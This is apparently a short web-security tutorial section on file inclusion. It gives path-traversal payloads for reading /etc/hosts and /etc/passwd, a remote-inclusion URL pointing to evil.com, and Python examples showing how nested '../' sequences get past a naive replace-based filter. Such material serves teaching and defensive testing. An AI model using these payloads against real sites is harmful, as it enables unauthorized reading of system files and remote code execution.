#### 2.1. About

- local and remote file inclusion
- payload examples: 
  - `https://site.com/?file=../../../../../../../etc/hosts`
  - `https://site.com/?file=http://evil.com?x.txt` (where `x.txt` contains malicious code)

#### 2.2. Input sanitization bypass for local file inclusion

As part of the triage process every `../` in the application gets removed.
```python
>>> input = "../../../../../../etc/passwd"
>>> print(input.replace('../', ''));
etc/passwd
```

We can bypass the protection as:
```python
>>> input = "..././..././..././..././..././..././etc/passwd"
>>> print(input.replace('../', ''));
../../../../../../etc/passwd
>>> input = "....//....//etc/passwd"
>>> print(input.replace('../', ''));
../../etc/passwd
```
File path traversal was possible because we abused the function that is suppose to sanitize the user-input.
